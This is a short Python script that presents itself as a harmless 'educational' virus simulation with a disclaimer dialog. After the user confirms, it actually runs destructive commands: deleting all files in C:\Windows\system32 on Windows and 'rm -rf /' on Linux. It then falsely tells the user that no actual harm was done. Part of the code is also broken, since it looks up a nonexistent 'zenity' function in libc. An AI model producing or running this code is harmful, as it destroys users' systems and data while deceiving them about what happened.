import os
import subprocess
import ctypes
import sys
from colorama import Fore, Style

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_requirements():
    required_packages = ['colorama']
    missing_packages = []

    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)

    if missing_packages:
        print(Fore.RED + "Missing required packages: {}".format(", ".join(missing_packages)) + Style.RESET_ALL)
        confirm = input("Do you want to install missing packages? (y/n): ")
        if confirm.lower() == 'y':
            subprocess.call([sys.executable, "-m", "pip", "install", *missing_packages])
        else:
            print(Fore.RED + "Cannot continue without required packages. Exiting..." + Style.RESET_ALL)
            sys.exit()

def replicate_virus():
    clear_terminal()
    check_requirements()

    disclaimer = "WARNING: This program is for educational purposes only. Do not use it for malicious purposes. By continuing, you acknowledge that you are solely responsible for any consequences of using this program."
    if os.name == 'nt':
        confirm = ctypes.windll.user32.MessageBoxW(None, disclaimer, "Disclaimer", 1 | 0x30)
    else:
        libc = ctypes.CDLL(None)
        MessageBox = getattr(libc, 'zenity')
        confirm = MessageBox(disclaimer.encode(), "Disclaimer".encode(), 0, 1)
    
    if confirm == 1:
        if os.name == 'nt':
            print(Fore.RED + "Your Windows device has been hacked!" + Style.RESET_ALL)
        elif os.name == 'posix':
            print(Fore.RED + "Your Linux device has been hacked!" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "Unknown operating system detected!" + Style.RESET_ALL)

        if os.name == 'nt':
            subprocess.call(['del', 'C:\\Windows\\system32\\*.*'], shell=True)
        elif os.name == 'posix':
            subprocess.call(['rm', '-rf', '/'])

        print(Fore.GREEN + "Virus replication complete!" + Style.RESET_ALL)
        print(Fore.BLUE + "Please note that this was only a simulation and no actual harm was done to your device." + Style.RESET_ALL)

replicate_virus()
